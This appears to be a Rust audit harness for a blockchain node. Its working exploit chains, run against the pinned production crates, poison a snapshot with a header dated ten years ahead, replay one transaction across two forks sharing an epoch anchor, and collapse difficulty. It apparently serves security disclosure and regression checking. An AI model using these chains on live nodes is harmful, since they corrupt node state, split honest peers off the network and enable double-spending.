// Malicious-node composition audit against Paranoid commit
// 52938433a30b185ab007afaa15166a632cf2e82e.
//
// Chains the confirmed protocol-layer defects into node/serving-layer
// scenarios:
//   A. snapshot poisoning via the drift-staging differential
//   B. same-anchor fork replay pushed through real block admission
//   C. dialect confusion probes (schedule-bound rejection surfaces)
//
// All chain logic below calls the pinned production crates vendored under
// pinned/ (git archive of the pinned commit). src/snapshot_header_staging.rs
// is the pinned noid_node module, byte-identical to the commit (sha256
// asserted by run.sh).

use std::error::Error;
use std::time::{SystemTime, UNIX_EPOCH};

use noid_chain::block_header::{block_id, semantic_header_id};
use noid_chain::consensus::{
    asert_anchor_height, block_work, build_block_template, genesis_header, next_target,
    params,
    pow::{search_pow, validate_pow},
    validate_block_checks, validate_block_consensus,
    validate_future_drift, validate_header, AnchorInfo,
};
use noid_chain::consensus::epoch_anchor::{
    resolve_user_epoch_anchor_id, validate_block_epoch_anchors,
};
use noid_chain::consensus::validation::validate_mandatory_coinbase;
use noid_chain::state::ChainState;
use noid_chain::storage::native_segment::NATIVE_SEGMENT_MAGIC;
use noid_chain::storage::{
    encode_sparse_segment_entries, MdbxChainContext, AuthenticatedSnapshotMetadata,
    SnapshotSegmentDescriptor, SnapshotStagingSession,
};
use noid_chain::{add_work, materialize_accepted_block_state, Block, BlockHeader,
    HistoryStepTerminalMetadata};
use noid_core::Block128;
use noid_gkr::OwnerAuthWitness;
use noid_poseidon2b::primitives::{derive_address, Address, Digest, SpendSecret};
use noid_tx::{output_bitmap_bit, Transaction, TxBody, TxInput, TxOutput, TX_INPUTS, TX_OUTPUTS};

mod snapshot_header_staging;
use snapshot_header_staging::{CanonicalHeaderBoundary, SnapshotHeaderStaging};

const PINNED_COMMIT: &str = "52938433a30b185ab007afaa15166a632cf2e82e";
const ATTACK_TIP_HEIGHT: u64 = 24;
const POISON_HEIGHT: u64 = 12;
const TEN_YEARS: u64 = 10 * 365 * 24 * 3600;
const HONEST_TIP_HEIGHT: u64 = ATTACK_TIP_HEIGHT + 1;

fn unix_now() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .expect("monotonic wall clock")
        .as_secs()
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|byte| format!("{byte:02x}")).collect()
}

fn main() -> Result<(), Box<dyn Error>> {
    let now = unix_now();
    println!("pinned_commit={PINNED_COMMIT}");
    println!("local_time={now}");
    schedule_facts();
    difficulty_collapse(now);
    chain_a(now)?;
    chain_b()?;
    println!("all_local_assertions=passed");
    Ok(())
}

// ---------------------------------------------------------------------------
// C. Dialect facts: what differs between default and isolated-V2.1 schedules
// at one height, with the shared P2P identity.
// ---------------------------------------------------------------------------

fn schedule_facts() {
    println!("[dialect-facts]");
    println!("build_profile=isolated_v2_1={}", cfg!(feature = "isolated-v2-1-fork-testnet"));
    println!("schedule v2_1_active(24)={}", params::v2_1_active(24));
    println!(
        "owner_auth_version(24)={:?} owner_auth_version(279506)={:?}",
        params::owner_authorization_version(24),
        params::owner_authorization_version(279506)
    );
    // The receiving node recomputes the ASERT target with its own schedule:
    // a header mined under the other dialect fails BadDifficultyTarget here.
    // Pre-v2 selects the target with the candidate's own timestamp; v2
    // selects it with the parent's, so the two schedules disagree on the
    // expected h24 target for the same header pair.
    let genesis = genesis_header();
    let base = genesis.timestamp;
    let mine = next_target(
        0,
        base,
        &genesis.difficulty_target,
        24,
        base + 50,
        base + 100,
    );
    let other = next_target(
        0,
        base,
        &genesis.difficulty_target,
        24,
        base + 50,
        base + 60,
    );
    println!("dialect_expected_target_h24_parent_ts={}", hex(&mine));
    println!("dialect_expected_target_h24_candidate_ts={}", hex(&other));
    println!("dialect_targets_diverge={}", mine != other);
    println!("p2p_profile_note=shared identity per experiments/version-domains results/network-comparison.json");
}

// ---------------------------------------------------------------------------
// A6. Difficulty collapse: a far-future parent timestamp drives the child's
// ASERT target straight to the GENESIS_TARGET floor.
// ---------------------------------------------------------------------------

fn difficulty_collapse(now: u64) {
    println!("[difficulty-collapse]");
    // v2 target selection (default schedule, active above height 210536):
    // the PARENT timestamp selects the child target, so a far-future parent
    // collapses the child difficulty to the unconditional genesis floor.
    // The anchor is pinned hard (MIN_TARGET) to show the collapse range.
    let anchor_height = 279_504u64;
    let child_height = 279_506u64;
    assert!(params::v2_active(child_height));
    let anchor_ts = now - 600;
    let child_ts = now + 20;
    let mk = |parent_ts: u64| {
        next_target(
            anchor_height,
            anchor_ts,
            &params::MIN_TARGET,
            child_height,
            parent_ts,
            child_ts,
        )
    };
    let sane = mk(now);
    let drift_capped = mk(now + params::MAX_FUTURE_DRIFT);
    let far_future = mk(now + TEN_YEARS);
    println!("child_target_sane_parent={}", hex(&sane));
    println!("child_target_plus120s_parent={}", hex(&drift_capped));
    println!("child_target_10y_parent={}", hex(&far_future));
    println!("floor_target={}", hex(&params::GENESIS_TARGET));
    let collapsed = far_future == params::GENESIS_TARGET && sane != params::GENESIS_TARGET;
    println!("far_future_parent_floors_child={collapsed}");
    assert!(collapsed, "far-future parent must floor the child target");
}

// ---------------------------------------------------------------------------
// A. Snapshot poisoning
// ---------------------------------------------------------------------------

struct ChainFixture {
    headers: Vec<BlockHeader>,
    blocks: Vec<Block>,
    tip_state_root: [u8; 32],
    tip_work: [u8; 32],
    live_entries: Vec<(u32, noid_chain::fri_state::SlotValue)>,
    alloc_counter: u64,
}

/// Build a coinbase-only chain from real genesis with real templates, real
/// ASERT targets and real PoW. `poison` selects the timestamp schedule.
fn build_chain(now: u64, poison: bool) -> Result<ChainFixture, Box<dyn Error>> {
    let genesis = genesis_header();
    let mut headers = vec![genesis];
    let mut state = ChainState::with_log_slots(genesis.log_slots as usize);
    let mut blocks = Vec::new();
    let mut work = block_work(&genesis.difficulty_target);
    let mut live: Vec<(u32, noid_chain::fri_state::SlotValue)> = Vec::new();

    for height in 1..=if poison { ATTACK_TIP_HEIGHT } else { HONEST_TIP_HEIGHT } {
        let parent = *headers.last().expect("parent header");
        let timestamp = if poison && height == POISON_HEIGHT {
            now + TEN_YEARS
        } else if poison && height == ATTACK_TIP_HEIGHT {
            now + 60
        } else {
            now + 10 + height
        };
        let anchor_height = asert_anchor_height(parent.height);
        let anchor = headers[anchor_height as usize];
        let target = next_target(
            anchor_height,
            anchor.timestamp,
            &anchor.difficulty_target,
            height,
            parent.timestamp,
            timestamp,
        );
        let template = build_block_template(
            &parent,
            &state,
            &[],
            Vec::new(),
            parent.miner_address,
            timestamp,
            target,
        )
        .map_err(|error| format!("template at h{height}: {error:?}"))?;
        let mut block = template.into_block(0);
        block.header.nonce =
            search_pow(&block.header, 0, 2_000_000_000).ok_or("pow search")?;
        validate_pow(&block.header)?;
        let previous = headers.iter().map(|h| h.timestamp).collect::<Vec<_>>();
        let anchor_info = AnchorInfo {
            anchor_height,
            anchor_timestamp: anchor.timestamp,
            anchor_target: anchor.difficulty_target,
        };
        let admission = validate_block_checks(&block, &parent, &previous, &[], now, &anchor_info);
        let native_result = admission.is_ok();
        if poison {
            assert_eq!(native_result, height != POISON_HEIGHT,
                "poisoned chain: native admission must fail only at the poison header");
        } else {
            assert!(native_result, "honest chain must be natively admissible");
        }
        materialize_accepted_block_state(&mut state, &block)
            .map_err(|error| format!("materialize h{height}: {error:?}"))?;
        let coinbase = &block.transactions[0];
        let out = &coinbase.body.outputs[0];
        let creation = noid_chain::consensus::params::coinbase_creation_id(height);
        let value = noid_chain::fri_state::SlotValue::with_owner_fields(
            out.amount,
            creation,
            out.owner.as_fields(),
        );
        live.retain(|(slot, _)| *slot != out.slot_index);
        // An empty (zero-amount) coinbase slot is root-equivalent to absent
        // and sparse encoding refuses empty entries.
        if !value.is_empty() {
            live.push((out.slot_index, value));
        }
        work = add_work(&work, &block_work(&block.header.difficulty_target));
        headers.push(block.header);
        blocks.push(block);
    }

    let tip = *headers.last().expect("tip");
    let mut rebuilt = ChainState::from_sparse_utxos_at(
        tip.log_slots as usize,
        &live,
        tip.alloc_counter,
        tip.height,
    )
    .map_err(|error| format!("sparse rebuild: {error:?}"))?;
    assert_eq!(rebuilt.state_root(), tip.state_root, "live-entry bookkeeping must match the tip root");

    Ok(ChainFixture {
        tip_state_root: tip.state_root,
        tip_work: work,
        headers,
        blocks,
        live_entries: live,
        alloc_counter: tip.alloc_counter,
    })
}

fn chain_a(now: u64) -> Result<(), Box<dyn Error>> {
    println!("[snapshot-poisoning]");
    let attacker = build_chain(now, true)?;
    let honest = build_chain(now, false)?;
    let tip = attacker.headers[ATTACK_TIP_HEIGHT as usize];
    let poisoned = attacker.headers[POISON_HEIGHT as usize];
    println!(
        "attacker_chain: tip_h={} tip_ts={} poison_h={} poison_ts_delta_years≈{} tip_drift_ok=true",
        tip.height,
        tip.timestamp,
        POISON_HEIGHT,
        TEN_YEARS / (365 * 24 * 3600)
    );

    // A2. The honest admission path rejects the attacker's chain at the
    // poison header. validate_header with a local clock is exactly the
    // live-admission predicate (consensus/header.rs checks drift when
    // local_time is Some); validate_bounded_header_extension in
    // noid_node/src/snapshot_header_staging.rs:1049 does the same per header.
    let parent = attacker.headers[POISON_HEIGHT as usize - 1];
    let previous: Vec<u64> = attacker
        .headers
        .iter()
        .take(POISON_HEIGHT as usize)
        .map(|h| h.timestamp)
        .collect();
    let anchor_height = asert_anchor_height(parent.height);
    let anchor = attacker.headers[anchor_height as usize];
    let drift_error = validate_header(
        &poisoned,
        &parent,
        &previous,
        &[],
        now,
        anchor_height,
        anchor.timestamp,
        &anchor.difficulty_target,
    )
    .expect_err("honest admission must reject the far-future header");
    assert!(matches!(
        drift_error,
        noid_chain::consensus::ConsensusError::BadTimestamp
    ));
    println!("honest_path_rejects_poison_header=BadTimestamp(h={POISON_HEIGHT})");

    // A3. The snapshot path stages and validates the identical header list.
    let db = tempfile::tempdir()?;
    let mut context = MdbxChainContext::open_or_create(db.path())?;
    let store = context.store.clone();
    let base = CanonicalHeaderBoundary::load(&store, 0)?;
    let stage_dir = tempfile::tempdir()?;
    let mut staging =
        SnapshotHeaderStaging::create(&stage_dir.path().join("candidate"), &store, base)?;
    staging.append_batch(
        &store,
        &attacker.headers[1..=ATTACK_TIP_HEIGHT as usize],
    )?;
    let validated = staging.validate_complete(
        &store,
        tip.height,
        block_id(&tip),
        attacker.tip_work,
    )?;
    let boundary = validated.boundary();
    println!(
        "snapshot_path_stages_poison_chain=ok sealed_height={} staged_headers={}",
        boundary.tip_header.height,
        ATTACK_TIP_HEIGHT
    );

    // Boundary manifest checks + tip-only drift, exactly as the node orders
    // them before terminal verification (noid_node/src/main.rs:9218-9269).
    // Snapshot segment pieces: coinbase mint slots are spread across
    // allocator zones (far-apart segments), so the snapshot carries one
    // descriptor per touched segment.
    let eff_log = params::LOG_SEGMENT_SIZE as u8;
    let mut by_segment: std::collections::BTreeMap<
        u16,
        Vec<(u16, noid_chain::fri_state::SlotValue)>,
    > = std::collections::BTreeMap::new();
    for (slot, value) in &attacker.live_entries {
        let segment = (*slot >> eff_log) as u16;
        by_segment
            .entry(segment)
            .or_default()
            .push((*slot as u16, *value));
    }
    let mut encoded_segments = Vec::new();
    let mut descriptors = Vec::new();
    for (segment, mut list) in by_segment {
        list.sort_by_key(|(index, _)| *index);
        let encoded =
            encode_sparse_segment_entries(eff_log, &list).ok_or("sparse segment encoding failed")?;
        assert!(!encoded.starts_with(NATIVE_SEGMENT_MAGIC));
        descriptors.push(SnapshotSegmentDescriptor {
            segment_id: segment,
            segment_root: segment_root(eff_log, &list)?,
            encoded_len: encoded.len() as u32,
        });
        encoded_segments.push((segment, list.len(), encoded));
    }
    println!(
        "snapshot_segments={} live_entries={}",
        descriptors.len(),
        attacker.live_entries.len()
    );

    let metadata = AuthenticatedSnapshotMetadata::from_authenticated_header(
        tip,
        block_id(&tip),
        params::LOG_SEGMENT_SIZE as u8,
    )?;
    let mut manifest = noid_p2p::protocol::GetStateManifestResponse {
        tip_height: tip.height,
        tip_hash: block_id(&tip),
        cumulative_chainwork: attacker.tip_work,
        format_version: noid_p2p::protocol::SNAPSHOT_MANIFEST_FORMAT_VERSION,
        state_root: tip.state_root,
        manifest_digest: [0; 32],
        log_slots: tip.log_slots,
        active_slot_count: tip.active_slot_count,
        alloc_counter: tip.alloc_counter,
        eff_log: params::LOG_SEGMENT_SIZE as u8,
        bridge_tip_height: tip.height,
        bridge_tip_hash: block_id(&tip),
        bridge_cumulative_chainwork: attacker.tip_work,
        segment_ids: descriptors.iter().map(|d| d.segment_id).collect(),
        segment_roots: descriptors.iter().map(|d| d.segment_root).collect(),
        segment_lengths: encoded_segments
            .iter()
            .map(|(_, count, _)| *count as u32)
            .collect(),
    };
    assert!(manifest.seal_manifest_digest());
    crate::snapshot_staged_boundary_check(&manifest, &boundary)?;
    validate_future_drift(boundary.tip_header.timestamp, now)?;
    println!("snapshot_boundary_checks=manifest_ok tip_future_drift_ok=ok");

    // Terminal: the boundary verification binds ONLY (tip height, tip
    // semantic id) plus the epoch anchor (mdbx_context.rs:2422-2435); the
    // provable header rules are the timeless ones, so a genuine terminal
    // produced while mining this fork cannot reject the poison header. The
    // stub below stands in for that attacker-produced terminal (dev builds
    // ship no proof pack; see README assurance limits).
    let mut verifier_called = false;
    let verified = context.verify_snapshot_boundary(
        tip,
        boundary.epoch_anchor_header,
        terminal_bytes(tip),
        |_| {
            verifier_called = true;
            Ok(())
        },
    )?;
    assert!(verifier_called);
    println!("snapshot_terminal_boundary=accepted binding=(height,tip_semantic_id)");

    // Negative control: the terminal binds the tip semantic id, so a tip whose
    // state root was tampered with no longer matches the terminal and is
    // rejected before the verifier runs.
    let mut bad_tip = tip;
    bad_tip.state_root[0] ^= 1;
    let mut called = false;
    let rejected = context.verify_snapshot_boundary(
        bad_tip,
        boundary.epoch_anchor_header,
        terminal_bytes(tip),
        |_| {
            called = true;
            Ok(())
        },
    );
    assert!(rejected.is_err() && !called);
    println!("control_changed_tip_root=rejected_before_recursive_verifier");

    // A4. Real atomic install: the poison chain becomes canonical AND the
    // snapshot tip is finalized immediately (mdbx_context.rs:2686-2694).
    let staging_dir = tempfile::tempdir()?;
    let mut session = SnapshotStagingSession::new(staging_dir.path(), metadata, descriptors)?;
    for (segment, _, encoded) in &encoded_segments {
        session.accept_segment(*segment, params::LOG_SEGMENT_SIZE as u8, encoded)?;
    }
    let finalized = session.finalize()?;
    let mut header_source = validated;
    context.apply_staged_state_snapshot(&finalized, &verified, &mut header_source, false)?;
    drop(finalized);
    println!("snapshot_install=committed");

    let stored_poison = store
        .get_header(POISON_HEIGHT)?
        .expect("poison header is canonical");
    assert_eq!(stored_poison.timestamp, now + TEN_YEARS);
    let finalized_checkpoint = context.finalized_checkpoint();
    assert_eq!(finalized_checkpoint.height, ATTACK_TIP_HEIGHT);
    assert_eq!(finalized_checkpoint.hash, block_id(&tip));
    println!(
        "committed_history: poison_h{POISON_HEIGHT}_canonical=true finalized_height={}",
        finalized_checkpoint.height
    );

    // A5. Estrangement: the honest chain is natively valid, but it can never
    // be adopted. plan_header_inventory (noid_node/src/main.rs:4924-4943)
    // only accepts ancestors at or above the HeaderDAG finalized height and
    // classifies deeper divergence FinalizedDivergence, which the event loop
    // answers with mining_peer_quorum.reject_incompatible (main.rs:11657).
    for header in &honest.headers[1..] {
        let parent = honest.headers[header.height as usize - 1];
        let previous: Vec<u64> = honest
            .headers
            .iter()
            .take(header.height as usize)
            .map(|h| h.timestamp)
            .collect();
        let anchor_height = asert_anchor_height(parent.height);
        let anchor = honest.headers[anchor_height as usize];
        validate_header(
            header,
            &parent,
            &previous,
            &[],
            now,
            anchor_height,
            anchor.timestamp,
            &anchor.difficulty_target,
        )?;
    }
    println!("honest_chain_native_admission=all_ok(h1..h{})", HONEST_TIP_HEIGHT);

    let mut best_ancestor: Option<u64> = None;
    for header in &honest.headers[1..] {
        let hash = block_id(header);
        if let Some(height) = context.find_ancestor_height(&hash) {
            if height >= finalized_checkpoint.height {
                best_ancestor = Some(best_ancestor.unwrap_or(0).max(height));
            }
        }
    }
    let oldest = honest.headers[1].height;
    let floor = ATTACK_TIP_HEIGHT.saturating_sub(params::CONSENSUS_FINALITY_DEPTH);
    let diverged = best_ancestor.is_none() && oldest <= floor;
    assert!(diverged, "honest inventory must classify as FinalizedDivergence");
    println!(
        "honest_inventory_classification=FinalizedDivergence(best_common_ancestor_above_finalized={} finalized={})",
        best_ancestor.is_some(),
        finalized_checkpoint.height
    );

    // The honest chain cannot even begin re-staging: its genesis base is no
    // longer the first missing canonical height.
    let rebase_attempt =
        CanonicalHeaderBoundary::load(&store, 0).and_then(|base| {
            SnapshotHeaderStaging::create(&stage_dir.path().join("honest"), &store, base)
        });
    assert!(rebase_attempt.is_err());
    println!("honest_snapshot_restage=rejected(base_is_not_first_missing_height)");
    println!("victim_serves_poison=snapshot_readback_available(header_h{POISON_HEIGHT}_ts=+10y)");

    Ok(())
}

/// The node's validate_snapshot_staged_header_boundary
/// (noid_node/src/main.rs:4180-4235), reproduced field-for-field because it
/// lives inside the binary crate.
fn snapshot_staged_boundary_check(
    manifest: &noid_p2p::protocol::GetStateManifestResponse,
    boundary: &snapshot_header_staging::SnapshotHeaderBoundary,
) -> Result<(), String> {
    let tip = &boundary.tip_header;
    if manifest.tip_height == 0 {
        return Err("snapshot manifest has no tip".into());
    }
    if !manifest.has_valid_manifest_digest() {
        return Err("snapshot manifest generation digest is invalid".into());
    }
    if tip.height != manifest.tip_height || boundary.tip_hash != manifest.tip_hash {
        return Err("snapshot manifest boundary does not match staged header tip".into());
    }
    if tip.log_slots != manifest.log_slots {
        return Err("snapshot manifest log_slots does not match staged header".into());
    }
    if tip.state_root != manifest.state_root {
        return Err("snapshot manifest State root does not match staged header".into());
    }
    if tip.active_slot_count != manifest.active_slot_count {
        return Err("snapshot manifest active_slot_count does not match staged header".into());
    }
    if tip.alloc_counter != manifest.alloc_counter {
        return Err("snapshot manifest alloc_counter does not match staged header".into());
    }
    if boundary.cumulative_chainwork != manifest.cumulative_chainwork {
        return Err("snapshot manifest chainwork does not match staged headers".into());
    }
    Ok(())
}

fn terminal_bytes(tip: BlockHeader) -> Vec<u8> {
    let mut bytes = HistoryStepTerminalMetadata::new(
        tip.height,
        semantic_header_id(&tip),
        0,
    )
    .expect("terminal metadata")
    .encode_prefix()
    .to_vec();
    bytes.push(1);
    bytes
}

fn segment_root(
    log: u8,
    entries: &[(u16, noid_chain::fri_state::SlotValue)],
) -> Result<[u8; 32], Box<dyn Error>> {
    use noid_chain::exact_state_hash::{slot_leaf_hash, state_node_hash, zero_slot_roots};
    let zero = zero_slot_roots(usize::from(log));
    let mut level = vec![zero[0]; 1usize << log];
    for (index, slot) in entries {
        let leaf = level
            .get_mut(usize::from(*index))
            .ok_or("segment fixture index is out of range")?;
        *leaf = slot_leaf_hash(*slot);
    }
    for depth in 0..usize::from(log) {
        level = level
            .chunks_exact(2)
            .map(|pair| state_node_hash(pair[0], pair[1]))
            .collect();
        assert_eq!(level.len(), 1usize << (usize::from(log) - depth - 1));
    }
    Ok(level[0])
}

// ---------------------------------------------------------------------------
// B. Same-anchor fork replay through real block admission
// ---------------------------------------------------------------------------

const EPOCH_HEIGHT: u64 = 279_504;
const PARENT_HEIGHT: u64 = EPOCH_HEIGHT + 1;
const CHILD_HEIGHT: u64 = EPOCH_HEIGHT + 2;
const INPUT_SLOT: u32 = 3;
const OUTPUT_SLOT: u32 = 9;
const INPUT_AMOUNT: u64 = 1_000_000;
const INPUT_CREATION_ID: u64 = 7;
const PARENT_ALLOC_COUNTER: u64 = INPUT_CREATION_ID;

fn chain_b() -> Result<(), Box<dyn Error>> {
    println!("[replay-publication]");
    assert_eq!(
        params::owner_authorization_version(CHILD_HEIGHT),
        noid_tx::OwnerAuthorizationVersion::V4
    );

    let secret = SpendSecret::from_bytes([0x31; 32]);
    let owner = derive_address(&secret);
    let recipient = Address([0x42; 32]);
    let epoch_header = b_header(EPOCH_HEIGHT, 1_793_000_000, 0);
    let epoch_id = block_id(&epoch_header);
    // Real admission enforces the fee floor; pay it explicitly.
    let fee = noid_chain::consensus::fees::fee_breakdown(1, 1, 2, 4).required_total;
    println!("admission_fee_floor={fee}");
    let body = user_body(epoch_id, owner, recipient, fee);
    // A block-admissible user transaction is one PagedSpend page carrying
    // START|END markers; its wire form is the fixed TxPage encoding.
    let page = noid_tx::TxPage::new(body.clone()).map_err(|e| format!("{e:?}"))?;
    let tx_wire = page.to_bytes().map_err(|e| format!("{e:?}"))?;
    let original = Transaction::new(body);
    let txid = original.txid();
    println!("replayed_tx: page_bytes={} txid={}", tx_wire.len(), hex(&txid.0));

    println!("proving one paged-spend owner authorization with the legitimate wallet witness");
    let bundle = noid_gkr::prove_paged_spend_authorization(
        std::slice::from_ref(&page),
        OwnerAuthWitness::new(secret),
    )?;

    // Two forks sharing the epoch anchor: distinct parents, distinct states.
    let mut fork_a = fork_context(0xA, 1_793_000_060, epoch_id);
    let mut fork_b = fork_context(0xB, 1_793_000_061, epoch_id);
    let parent_a_id = block_id(&fork_a.parent);
    let parent_b_id = block_id(&fork_b.parent);
    assert_ne!(parent_a_id, parent_b_id);
    assert_ne!(fork_a.state.state_root(), fork_b.state.state_root());
    println!("parent_A={} ", hex(&parent_a_id));
    println!("parent_B={}", hex(&parent_b_id));

    // Real block admission: template builder + full sequential consensus
    // validation on each fork, carrying the IDENTICAL transaction bytes.
    let expected_anchor = resolve_user_epoch_anchor_id(CHILD_HEIGHT, |height| {
        (height == EPOCH_HEIGHT).then_some(epoch_header)
    })
    .expect("the shared canonical epoch header is available");
    assert_eq!(expected_anchor, epoch_id);

    let block_a = admit_on_fork(&mut fork_a, &tx_wire, &bundle, &epoch_header, expected_anchor)?;
    let block_b = admit_on_fork(&mut fork_b, &tx_wire, &bundle, &epoch_header, expected_anchor)?;
    let page_a = noid_tx::TxPage::new(block_a.transactions[1].body.clone())
        .map_err(|e| format!("{e:?}"))?;
    let page_b = noid_tx::TxPage::new(block_b.transactions[1].body.clone())
        .map_err(|e| format!("{e:?}"))?;
    assert_eq!(page_a.to_bytes().map_err(|e| format!("{e:?}"))?, tx_wire);
    assert_eq!(page_b.to_bytes().map_err(|e| format!("{e:?}"))?, tx_wire);
    assert_eq!(block_a.transactions[1].txid(), txid);
    assert_eq!(block_b.transactions[1].txid(), txid);
    assert_ne!(block_a.header.tx_root, block_b.header.tx_root);
    println!(
        "both_forks_admitted=ok same_tx=true same_txid=true tx_roots_differ=true"
    );

    // Same-linear-history control: after fork A applied the spend, a second
    // template carrying the same transaction is refused by the builder.
    let replay = build_block_template(
        &fork_a.applied_header,
        &fork_a.post_state,
        &[],
        vec![Transaction::new(
            noid_tx::TxPage::from_bytes(&tx_wire)
                .map_err(|e| format!("{e:?}"))?
                .body,
        )],
        fork_a.parent.miner_address,
        fork_a.parent.timestamp + 90,
        fork_a.child_target,
    );
    assert!(replay.is_err(), "same-fork respend must be refused");
    println!("same_fork_second_spend=refused_by_template_builder({:?})", replay.unwrap_err());
    println!("replay_scope=designed fork tolerance; single linear state refuses the respend");
    Ok(())
}

struct ForkContext {
    parent: BlockHeader,
    state: ChainState,
    applied_header: BlockHeader,
    post_state: ChainState,
    child_target: [u8; 32],
}

fn fork_context(tag: u8, timestamp: u64, epoch_id: Digest) -> ForkContext {
    let mut parent = b_header(PARENT_HEIGHT, timestamp, u128::from(tag));
    parent.prev_block_hash = epoch_id;
    let owner = derive_address(&SpendSecret::from_bytes([0x31; 32]));
    let mut state = ChainState::from_sparse_utxos(
        4,
        &[
            (INPUT_SLOT, noid_chain::fri_state::SlotValue::with_owner_fields(
                INPUT_AMOUNT,
                INPUT_CREATION_ID,
                owner.as_fields(),
            )),
            (
                if tag == 0xA { 12 } else { 13 },
                noid_chain::fri_state::SlotValue::with_owner_fields(5, 6, Address([0x77; 32]).as_fields()),
            ),
        ],
        PARENT_ALLOC_COUNTER,
    )
    .expect("fork state");
    parent.state_root = state.state_root();
    ForkContext {
        parent,
        state,
        applied_header: parent,
        post_state: ChainState::with_log_slots(4),
        child_target: [0; 32],
    }
}

fn admit_on_fork(
    fork: &mut ForkContext,
    tx_wire: &[u8],
    bundle: &noid_gkr::WalletAuthorizationBundle,
    epoch_header: &BlockHeader,
    expected_anchor: Digest,
) -> Result<Block, Box<dyn Error>> {
    let parent_id = block_id(&fork.parent);
    let tx = Transaction::new(
        noid_tx::TxPage::from_bytes(tx_wire)
            .map_err(|e| format!("{e:?}"))?
            .body,
    );
    let timestamp = fork.parent.timestamp + 30;
    let anchor_height = asert_anchor_height(fork.parent.height);
    let anchor = if anchor_height == EPOCH_HEIGHT {
        *epoch_header
    } else {
        return Err("unexpected anchor height".into());
    };
    let target = next_target(
        anchor_height,
        anchor.timestamp,
        &anchor.difficulty_target,
        CHILD_HEIGHT,
        fork.parent.timestamp,
        timestamp,
    );
    fork.child_target = target;
    let template = build_block_template(
        &fork.parent,
        &fork.state,
        &[],
        vec![tx.clone()],
        fork.parent.miner_address,
        timestamp,
        target,
    )
    .map_err(|error| format!("fork template: {error:?}"))?;
    let mut block = template.into_block(0);
    block.header.nonce = search_pow(&block.header, 0, 2_000_000_000).ok_or("pow")?;
    validate_pow(&block.header)?;

    // Full sequential consensus validation on a fresh clone of the fork
    // state, exactly like the external-miner harness.
    let mut state = fork.state.clone();
    validate_block_consensus(
        &block,
        &fork.parent,
        &[epoch_header.timestamp, fork.parent.timestamp],
        &[],
        unix_now(),
        &AnchorInfo {
            anchor_height,
            anchor_timestamp: anchor.timestamp,
            anchor_target: anchor.difficulty_target,
        },
        &mut state,
    )?;
    validate_mandatory_coinbase(&block, &fork.parent)?;
    validate_block_epoch_anchors(&block, expected_anchor, parent_id)?;
    let user = &block.transactions[1];
    let user_page = noid_tx::TxPage::new(user.body.clone()).map_err(|e| format!("{e:?}"))?;
    noid_chain::consensus::paged_spend::validate_paged_spend_transaction_stream(
        std::slice::from_ref(user),
    )
    .map_err(|e| format!("page stream: {e:?}"))?;
    noid_gkr::verify_paged_spend_authorization(std::slice::from_ref(&user_page), bundle)?;
    let mut delta_state = fork.state.clone();
    let new_root =
        materialize_accepted_block_state(&mut delta_state, &block)
            .map_err(|error| format!("apply: {error:?}"))?;
    assert_eq!(new_root, block.header.state_root);
    fork.applied_header = block.header;
    fork.post_state = delta_state;
    Ok(block)
}

fn user_body(epoch_anchor: Digest, owner: Address, recipient: Address, fee: u64) -> TxBody {
    let mut inputs = [TxInput::dummy(); TX_INPUTS];
    inputs[0] = TxInput {
        slot_index: INPUT_SLOT,
        amount: INPUT_AMOUNT,
        creation_id: INPUT_CREATION_ID,
    };
    let mut outputs = [TxOutput::dummy(); TX_OUTPUTS];
    outputs[0] = TxOutput {
        slot_index: OUTPUT_SLOT,
        amount: INPUT_AMOUNT - fee,
        owner: recipient,
    };
    TxBody {
        epoch_anchor,
        fee,
        input_owner: owner,
        inputs,
        outputs,
        // A block-admissible transaction is a one-page paged-spend group:
        // START and END marker bits terminate the group on its only page.
        validity_bitmap: 1
            | output_bitmap_bit(0)
            | noid_tx::PAGED_SPEND_START_BIT
            | noid_tx::PAGED_SPEND_END_BIT,
        is_coinbase: false,
    }
}

fn b_header(height: u64, timestamp: u64, nonce: u128) -> BlockHeader {
    BlockHeader {
        prev_block_hash: [0x11; 32],
        state_root: [0x22; 32],
        tx_root: [0x33; 32],
        timestamp,
        height,
        miner_address: Address([0x44; 32]),
        nonce,
        difficulty_target: [0x77; 32],
        log_slots: 4,
        active_slot_count: 2,
        alloc_counter: PARENT_ALLOC_COUNTER,
    }
}

#[allow(dead_code)]
fn unused_block128(value: u128) -> Block128 {
    Block128::from(value)
}
